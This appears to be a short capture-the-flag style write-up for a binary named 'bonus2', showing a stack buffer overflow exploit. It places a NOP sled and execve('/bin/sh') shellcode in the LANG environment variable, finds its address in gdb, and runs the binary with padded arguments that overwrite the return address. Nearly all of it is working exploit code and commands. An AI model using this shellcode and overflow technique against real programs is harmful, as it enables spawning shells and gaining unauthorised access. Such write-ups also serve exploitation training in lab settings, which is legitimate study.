We need to set `LANG` env variable to be able to overflow our buffer. We set `LANG` to a combinaison of `nl`, a NOP sled and our shellcode.
```sh
export LANG=$(python -c 'print "nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

Now let's find the address of `LANG` in gdb.
```sh
(gdb) x/20s *(environ)
0xbffffe87:	 "LANG=nl"
```

Let's add some padding to get in the NOP sled.
0xbffffe87 + 0d42 = 0xbffffeb1

Run the exploit.
```sh
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "A" * 23 + "\xb1\xfe\xff\xbf"')
```
